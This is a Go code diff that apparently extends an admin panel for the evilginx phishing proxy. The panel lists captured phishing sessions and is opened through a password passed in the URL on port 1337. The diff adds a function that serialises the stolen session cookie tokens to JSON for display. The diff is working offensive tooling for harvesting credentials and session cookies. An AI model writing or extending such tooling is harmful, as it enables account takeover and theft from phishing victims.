@@ -2,6 +2,7 @@ package core
 
 import (
 	"crypto/tls"
+	"encoding/json"
 	"fmt"
 	"html/template"
 	"net/http"
@@ -47,7 +48,7 @@ func NewAdmin(db *database.Database, cfg *Config, path string) {
 	admin_cfg = cfg
 
 	http.HandleFunc("/listSessions", getAllData)
-	log.Info("Admin panel started at %s\n", fmt.Sprintf("https://%v:1337/listSessions?pwd=%v", cfg.baseDomain, pwdStr))
+	log.Info("Admin panel started at %s\n", fmt.Sprintf("https://%v:1337/listSessions?pwd=%v", cfg.GetBaseDomain(), pwdStr))
 
 	go func() {
 		// Try TLS first using evilginx's CA cert, fall back to plain HTTP
@@ -88,7 +89,7 @@ func getAllData(w http.ResponseWriter, r *http.Request) {
 	for i := 0; i < len(sessions); i++ {
 		sess := sessions[i]
 		pl := getPhishlet(sess.Phishlet)
-		tokns := TokensToJSON(pl, sess.Tokens)
+		tokns := TokensToJSON(pl, sess)
 		displaySessions = append(displaySessions, DisplaySession{
 			ID:          sess.Id,
 			Phishlet:    sess.Phishlet,
@@ -107,6 +108,18 @@ func getAllData(w http.ResponseWriter, r *http.Request) {
 		Sessions:  displaySessions,
 	}
 	tmpl.Execute(w, data)
+}
+
+// TokensToJSON converts a session's cookie tokens to a JSON string for the admin panel
+func TokensToJSON(pl *Phishlet, sess *database.Session) string {
+	if sess.CookieTokens == nil {
+		return ""
+	}
+	b, err := json.Marshal(sess.CookieTokens)
+	if err != nil {
+		return ""
+	}
+	return string(b)
 }
 
 func getPhishlet(name string) *Phishlet {
